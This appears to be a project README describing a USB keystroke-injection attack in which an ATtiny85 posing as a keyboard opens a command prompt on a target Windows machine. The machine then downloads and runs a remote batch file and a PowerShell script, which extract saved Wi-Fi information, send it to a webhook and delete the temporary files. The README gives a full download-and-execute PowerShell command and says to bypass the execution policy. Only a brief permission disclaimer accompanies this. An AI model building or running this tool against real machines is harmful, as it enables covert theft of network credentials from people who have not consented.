## Project: Automated Wi-Fi Info Extraction with ATtiny85

### Author: Easin Arafat (KingBOB)

---

### **Overview**

This project automates the process of extracting Wi-Fi information from a Windows machine using a single batch file (`trigger.bat`). The ATtiny85 USB device emulates a keyboard to execute the batch script, which performs the following tasks:

1. Downloads all required files (`wifi_info.ps1`).
2. Executes the PowerShell script to extract Wi-Fi data.
3. Sends the data to a local webhook.
4. Cleans up by deleting all temporary files.

---

### **Steps to Use**

#### **1. Prepare the Environment**

- Host the batch file (`trigger.bat`) and the PowerShell script (`wifi_info.ps1`) on a GitHub repository or a web server.
- Ensure the webhook (`webhook.php`) is set up and accessible on `http://localhost/webhook/webhook.php`.

#### **2. Test Manually**

1. Open Command Prompt.
2. Run the following command to execute `trigger.bat`:
   ```cmd
   powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/<your-repo>/trigger.bat' -OutFile %temp%\trigger.bat; Start-Process %temp%\trigger.bat"
   ```
3. Verify that:
   - The `wifi_info.ps1` script runs successfully.
   - Data is sent to the webhook.
   - Temporary files are deleted.

#### **3. Deploy with ATtiny85**

- Program the ATtiny85 with the provided script.
- Plug the ATtiny85 into the target machine.
- It will:
  1. Open CMD.
  2. Download and execute `trigger.bat`.

---

### **Important Notes**

1. Use this project only in a controlled environment or with explicit permission.
2. Ensure PowerShell execution policy is not restricted (`ExecutionPolicy Bypass`).
3. Test thoroughly in a sandbox or virtual machine before deployment.

---

### **Author**

Easin Arafat (KingBOB)
